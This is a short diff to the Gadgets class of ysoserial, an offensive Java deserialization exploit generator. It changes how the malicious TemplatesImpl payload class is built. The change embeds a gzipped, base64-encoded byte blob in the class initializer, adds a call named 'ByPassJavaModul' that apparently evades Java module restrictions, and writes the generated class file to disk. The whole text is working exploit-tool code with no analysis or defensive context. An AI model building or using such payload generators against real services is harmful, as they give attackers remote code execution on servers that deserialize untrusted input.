@@ -8,10 +8,7 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
-import javassist.ClassClassPath;
-import javassist.ClassPool;
-import javassist.CtClass;
-import javassist.LoaderClassPath;
+import javassist.*;
 import org.apache.commons.codec.binary.Base64;
 import org.apache.commons.lang.RandomStringUtils;
 import org.apache.wicket.util.file.Files;
@@ -142,7 +139,8 @@ public class Gadgets {
         if (bytes != null) {
             // FILE:
             ctClass = pool.get("ysoserial.payloads.templates.ClassLoaderTemplate");
-            ctClass.setName(ctClass.getName() + System.nanoTime());
+            String name = ctClass.getName() + System.nanoTime();
+            ctClass.setName(name);
             ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
             GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf);
             gzipOutputStream.write(bytes);
@@ -150,6 +148,9 @@ public class Gadgets {
             String content = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
             // System.out.println(content);
             ctClass.makeClassInitializer().insertBefore(content);
+            ctClass.makeClassInitializer().insertBefore("ByPassJavaModul("+name+".class);");
+            ctClass.writeFile();
+
 //            ctClass.setSuperclass(superC);
             classBytes = ctClass.toBytecode();
         }
